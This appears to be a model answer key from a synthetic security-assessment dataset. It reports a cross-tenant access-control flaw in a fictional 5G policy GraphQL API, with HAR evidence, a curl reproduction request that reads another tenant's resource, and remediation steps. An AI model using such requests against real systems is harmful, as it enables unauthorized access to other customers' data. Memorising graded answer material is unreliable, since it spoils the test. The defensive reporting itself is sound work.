# Expected Response

## System
- Domain: Telecom / 5G Core
- System: SpectreNet Policy Control
- Example ID: GQL-0165

## Priority Findings

### Finding 1: 5G Telecom — Metadata Attribute Side-Channel Exposes Cross-Tenant Policy Data (Pattern 2.2)
**Severity:** High
**Category:** BAC / Metadata/Attribute Side-Channel

**Summary:**
Per §5.0 (Pattern 2.2 — metadata/attribute side-channel): The `getResource` resolver exposes `internalNotes` metadata that leaks cross-tenant 5G policy configuration without explicit authorization. An attacker from `tenant-1ebc` queried `getResource(id: "R-2165")` and received policy control data belonging to `tenant-06ff`, including `sensitiveField: "CONFIDENTIAL-1ebc06ff"` and `internalNotes: "Internal data exposed"`. In Telecom / 5G Core, this exposes subscriber QoS rules, network slice configurations, and internal policy notes.

**Evidence from HAR:**
- Request: `POST https://api.spectrenet-policy-co.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-1ebc`
- Query: `getResource(id: "R-2165") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-06ff"`, `ownerId: "other-user-1ebc06ff"`, `sensitiveField: "CONFIDENTIAL-1ebc06ff"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-1ebc06ff`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 2.2 | Metadata side-channel, internalNotes exposed |
| HAR request | x-tenant-id | Attacker tenant-1ebc |
| HAR response | tenantId | Cross-tenant 5G policy tenant-06ff |
| HAR response | internalNotes | Internal data exposed (side-channel) |

## Steps to Reproduce

### Step 1 — getResource 5G policy metadata side-channel (HAR)
```bash
curl -s -X POST https://api.spectrenet-policy-co.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-1ebc" \
  -d '{"query": "query { getResource(id: \"R-2165\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenant-06ff` policy metadata returned. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Remove `internalNotes` from schema or restrict to admin role.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
